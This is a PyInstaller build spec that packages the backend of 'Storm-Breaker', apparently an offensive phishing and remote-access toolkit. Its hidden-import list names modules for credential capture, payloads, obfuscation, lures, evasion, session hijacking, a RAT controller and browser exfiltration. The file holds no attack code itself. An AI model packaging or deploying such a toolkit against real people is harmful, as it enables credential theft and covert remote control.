# -*- mode: python ; coding: utf-8 -*-
"""PyInstaller spec for the Storm-Breaker backend sidecar (P9.2).

onedir mode (stable paths, no temp extraction):
  dist/storm-breaker-backend/
    storm-breaker-backend            <- entry (binds 127.0.0.1:2525)
    _internal/
      app/  database.pyc  <15 legacy modules>
      templates/ flask_templates/ assets/   (data, absolute-path resolved)
      check-c.json config.php storm_breaker.db

All backend paths resolve off ``__file__`` (app.state.STORM_WEB etc.),
so inside the bundle they land in ``_internal/`` and persist across runs.
Rollback: delete build/ dist/ backend_entry.py + this spec.
"""
import os

STORM = os.path.abspath('storm-web')

datas = [
    (os.path.join(STORM, 'templates'), 'templates'),
    (os.path.join(STORM, 'flask_templates'), 'flask_templates'),
    (os.path.join(STORM, 'assets'), 'assets'),
    (os.path.join(STORM, 'check-c.json'), '.'),
    (os.path.join(STORM, 'config.php'), '.'),
    (os.path.join(STORM, 'storm_breaker.db'), '.'),
]

hiddenimports = [
    'database',
    'app', 'app.state',
    'app.core', 'app.core.state', 'app.core.db', 'app.core.jobs',
    'app.core.lockout', 'app.core.passwords', 'app.core.retention',
    'app.core.hardening',
    'app.core.migrations', 'app.core.migrations.runner',
    'app.core.migrations.baseline',
    'app.blueprints',
    'app.blueprints.auth', 'app.blueprints.capture', 'app.blueprints.capture_rx',
    'app.blueprints.capture_sessions', 'app.blueprints.capture_c2',
    'app.blueprints.capture_mobile', 'app.blueprints.intel',
    'app.blueprints.credentials', 'app.blueprints.payloads',
    'app.blueprints.obfuscation', 'app.blueprints.reports',
    'app.blueprints.lures', 'app.blueprints.campaigns',
    'app.blueprints.evasion', 'app.blueprints.threat_intel',
    'app.blueprints.session_hijack', 'app.blueprints.pivot',
    'app.blueprints.rat', 'app.blueprints.ai_threat',
    'app.blueprints.zeroday', 'app.blueprints.quantum',
    'app.blueprints.deeprecon', 'app.blueprints.browser_exfil',
    'app.blueprints.system', 'app.blueprints.templates',
    'app.blueprints.jobs', 'app.blueprints.panel', 'app.blueprints.playbooks',
    # legacy modules (many are imported lazily inside routes/services)
    'telegram_bot', 'credential_parser', 'payload_generator',
    'obfuscation_engine', 'report_generator', 'lure_generator',
    'evasion_framework', 'threat_intel', 'session_hijacker',
    'pivot_engine', 'rat_controller', 'ai_threat_analyzer',
    'zeroday_lab', 'quantum_crypto', 'deep_recon',
]

a = Analysis(
    ['backend_entry.py'],
    pathex=[STORM],
    binaries=[],
    datas=datas,
    hiddenimports=hiddenimports,
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[],
    noarchive=False,
)
pyz = PYZ(a.pure)

exe = EXE(
    pyz,
    a.scripts,
    [],
    exclude_binaries=True,
    name='storm-breaker-backend',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=False,
    console=True,
)
coll = COLLECT(
    exe,
    a.binaries,
    a.zipfiles,
    a.datas,
    strip=False,
    upx=False,
    name='storm-breaker-backend',
)
